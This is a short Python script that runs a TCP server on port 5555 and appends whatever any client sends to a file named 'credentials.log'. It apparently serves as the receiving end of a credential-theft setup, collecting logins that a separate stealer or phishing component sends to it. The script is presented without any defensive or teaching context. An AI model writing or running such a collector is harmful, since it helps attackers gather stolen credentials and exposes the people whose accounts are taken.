#!/usr/bin/python3

import socket

FILENAME = 'credentials.log'

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('', 5555))
    server.listen()
    print('[+] Server is up!')

    try:
        while True:
            conn, addr = server.accept()
            print(f'Connection from {addr[0]} on port {addr[1]}')

            data = b''
            while True:
                packet = conn.recv(1024)
                if not packet:
                    break
                data += packet

            with open(FILENAME, 'a+') as fh:
                fh.write(data.decode())

            print('[+] Received Successfully!')
            conn.close()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    main()

